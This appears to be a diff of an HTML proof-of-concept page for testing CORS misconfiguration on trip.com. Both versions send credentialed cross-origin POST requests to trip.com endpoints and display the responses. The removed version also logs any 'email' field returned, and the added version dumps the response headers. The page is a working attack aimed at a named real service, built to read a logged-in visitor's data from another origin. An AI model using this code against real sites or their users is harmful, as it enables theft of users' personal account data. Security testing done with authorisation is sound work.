@@ -2,74 +2,41 @@
 <html>
 <body>
 
-<h1>CORS Test</h1>
-
+<h1>CORS Chain Test</h1>
 <pre id="result"></pre>
 
 <script>
 
-const TARGET = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?x-traceID=";
+const result = document.getElementById("result");
 
-const body = {
-    head: {
-        locale: "",
-        currency: "",
-        vID: ""
-    },
-    platform: "Online",
-    componentType: "online-app-download-universal",
-    version: "6.0.5",
-    pageId: "10320668151",
-    aid: 0,
-    sid: 0,
-    customId: "adBanner",
-    customParam: {}
-};
-
-
-fetch(TARGET, {
+fetch("https://chloro.trip.com/v2/d", {
     method: "POST",
-
     credentials: "include",
-
     headers: {
-        "Content-Type": "application/json"
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
     },
-
-    body: JSON.stringify(body)
+    body: new URLSearchParams({
+        version: "11",
+        serverName: "https://www.trip.com",
+        guid: ""
+    })
 })
 
-.then(async res => {
+.then(async r => {
+    const text = await r.text();
 
-    console.log("Status:", res.status);
+    result.textContent =
+        "Status: " + r.status +
+        "\n\n" +
+        text;
 
-    const text = await res.text();
-
-    document.getElementById("result").textContent =
-        "Status: " + res.status + "\n\n" + text;
-
-
-    try {
-
-        const json = JSON.parse(text);
-
-        console.log("JSON:", json);
-
-        if(json.email){
-            console.log("EMAIL:", json.email);
-        }
-
-    } catch(e){
-        console.log("Not JSON");
-    }
+    console.log("Headers:");
+    console.log([...r.headers.entries()]);
 
 })
 
 .catch(err => {
-
-    document.getElementById("result").textContent =
-    "ERROR:\n" + err;
-
+    result.textContent = "ERROR:\n" + err;
 });
 
 </script>
